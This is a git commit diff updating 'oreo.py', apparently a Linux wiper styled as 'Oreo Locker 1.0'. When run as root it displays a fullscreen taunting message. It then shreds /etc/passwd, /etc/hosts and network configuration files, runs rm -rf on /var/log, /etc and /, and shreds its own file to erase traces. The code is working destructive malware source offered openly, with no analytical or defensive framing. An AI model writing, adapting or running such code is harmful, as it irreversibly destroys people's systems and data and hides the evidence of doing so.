6b16259f8ad01f8cf9b5de714a8efdbd695763f1
Roni <107792221+conglome@users.noreply.github.com>
2022-09-04 15:04:35 +0300

    Update oreo.py

--- oreo.py
+++ oreo.py
@@ -1,7 +1,8 @@
 import tkinter as tk
 import os
+from os import path
 import platform
-import threading
+import subprocess as sp
 
 class Utils:
 
@@ -11,32 +12,43 @@ class Utils:
     def rgb_hack(self, rgb):
         return "#%02x%02x%02x" % rgb  
 
-    directory_list = ["/etc/network/interfaces", "/etc/dhcp/dhclient.conf", "/etc/hosts", "/etc/passwd"]
-    need_removing_list = ["/var/log", "/etc", "/"]
+    
 
-    def MainThread(self):
-        shred_command = "shred -z -n 30 "
-        rmrf_command = "rm -rf "
-        UT = Utils()
-        root = tk.Tk()
-        root.title("Oreo Locker 1.0")
+directory_list = ["/etc/network/interfaces", "/etc/dhcp/dhclient.conf", "/etc/hosts", "/etc/passwd"]
+need_removing_list = ["/var/log", "/etc", "/"]
 
-        tk.Label(root, text='Dear user, you have been infected with Oreo Locker and there is no way around it.', anchor="center").pack()
-        tk.Label(root, text='Your linux system is currently being destroyed and corrupted.', anchor="center").pack()
-        tk.Label(root, text='All you can do is wait here and cry as loud as possible.', anchor="center").pack()
+def MainThread():
+    shred_command = "shred -z -n 30 "
+    rmrf_command = "rm -rf "
+    root = tk.Tk()
+    UT = Utils()
 
-        root.geometry("1920x1080")
-        root.resizable(False,False)
-        root.attributes('-fullscreen',True)
-        root.config(bg=UT.rgb_hack((0, 0, 0)), fg="red") 
-        root.mainloop()
+    root.title("Oreo Locker 1.0")
+    tk.Label(root, text='Dear user, you have been infected with Oreo Locker and there is no way around it.', anchor="center").pack()
+    tk.Label(root, text='Your linux system is currently being destroyed and corrupted.', anchor="center").pack()
+    tk.Label(root, text='All you can do is wait here and cry as loud as possible.', anchor="center").pack()
 
-        for x in UT.directory_list:
-            os.system(shred_command + x)
+    root.geometry("1920x1080")
+    root.resizable(False,False)
+    root.attributes('-fullscreen',True)
 
-        for f in UT.need_removing_list:
-            os.system("cd /")
-            os.system(rmrf_command + f + "*")
+    root.config(bg=UT.rgb_hack((0, 0, 0)), fg="red") 
+    root.mainloop()
+
+    for x in directory_list:
+        os.system(shred_command + x)
+
+    for f in need_removing_list:
+        os.system("cd /")
+        os.system(rmrf_command + f + "*")
+
+    
+def SelfDestruct():
+    self_path = path.abspath(__file__)
+    sp.call(["mkdir", "/home/.d"])
+    sp.call(["/usr/bin/shred", "-z -f -n 20" , self_path])
+    quit()
+
 
 if (os.getuid() != 0):
     print("Run with root privileges")
@@ -46,19 +58,10 @@ if (platform.system() != "Linux"):
     print("This file runs only on linux")
     quit()
 
-try:
-    MainFunc = Utils()
-    MainThread = threading.Thread(target=MainFunc.MainThread(), args=(10,))
-    MainThread.start()
-    MainThread.join()
+if __name__ == "__main__":
+    MainThread()
+    SelfDestruct()
 
-    quit()
-   
-except:
-    pass
-
-while (1):
-    pass
 
 
 
